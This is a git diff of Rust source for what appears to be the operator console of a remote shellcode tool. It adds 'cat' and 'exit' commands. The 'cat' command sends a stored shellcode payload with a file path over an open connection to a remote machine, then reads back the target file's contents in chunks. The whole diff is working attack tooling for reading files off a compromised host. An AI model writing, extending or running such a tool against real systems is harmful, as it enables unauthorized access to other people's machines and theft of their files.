@@ -1,4 +1,4 @@
-use std::{io::{self, Write, Read}, error::Error};
+use std::{io::{self, Write, Read}, error::Error, net::Shutdown};
 
 use colored::Colorize;
 use errno::Errno;
@@ -106,6 +106,43 @@ fn dir(config: &Config, file: &str) -> Result<(), Box<dyn Error>> {
     Ok(())
 }
 
+fn cat(config: &Config, file: &str) -> Result<(), Box<dyn Error>> {
+    if config.conn.is_none() {
+        return Err("Server not connected".into());
+    }
+    let cat_sender = SYS_OPEN_CAT_SENDER;
+    let mut cat_shellcode = cat_sender.shellcode.to_vec();
+    cat_shellcode.extend(file.as_bytes());
+    cat_shellcode.push(0);
+
+    let mut conn = config.conn.as_ref().unwrap();
+    conn.write(&cat_shellcode)?;
+
+    let mut beacon_buff = [0; 8];
+    let mut file_content_buff = Vec::new();
+    loop {
+        conn.read_exact(&mut beacon_buff)?;
+        let beacon = i64::from_le_bytes(beacon_buff);
+        if beacon == 0 {
+            break;
+        }
+        if beacon < 0 {
+            let e = -beacon;
+            let message = format!("cat: cannot access '{}': {}", file, Errno(e as i32));
+            return Err(message.into());
+        }
+        let chunk_len = beacon as u64;
+        let mut chunk_buff = vec![0; chunk_len as usize];
+        conn.read_exact(&mut chunk_buff)?;
+        file_content_buff.extend(chunk_buff);
+    }
+
+    let file_content = String::from_utf8_lossy(&file_content_buff);
+    println!("{}", file_content);
+
+    Ok(())
+}
+
 fn help() {
     println!(
         "
@@ -116,8 +153,27 @@ fn help() {
         -------       -------       -----------
         ls [DIR]      List directory
         dir [DIR]     List directory
+        cat [FILE]    Print File Content
+        exit          Exit shell
 "
     ); 
+}
+
+fn exit(config: &mut Config) -> Result<(), Box<dyn Error>> {
+    let stdin = io::stdin();
+    loop {
+        let mut line = String::new();
+        let quote = "Exit server? y) n) ".bold();
+        println!("{}", quote);
+        let bytes_read = stdin.read_line(&mut line)?;
+        if bytes_read != 0 && line.chars().nth(0).unwrap() == 'y'{
+            config.conn.as_ref().unwrap().shutdown(Shutdown::Both)?;
+            config.conn = None;
+            break;
+        }
+    }
+
+    Ok(())
 }
 
 pub fn prompt(config: &mut Config) -> Result<(), Box<dyn Error>> {
@@ -153,7 +209,24 @@ pub fn prompt(config: &mut Config) -> Result<(), Box<dyn Error>> {
                         print_error(&message);
                     }
                 },
-                
+                "cat" | "type" => {
+                    if let Some(f) = iter.next() {
+                        if let Err(err) = cat(config, f) {
+                            let message = format!("Error: {}", err);
+                            print_error(&message);
+                        }
+                    } else {
+                        print_error("Error: cat: no file specified")
+                    }
+                },
+                "exit" => {
+                    if let Err(err) = exit(config) {
+                        let message = format!("Error: {}", err);
+                        print_error(&message);
+                    } else {
+                        break;
+                    }
+                },
                 _ => {
                     let message = format!("Unknown command '{}'", command);
                     print_error(&message);
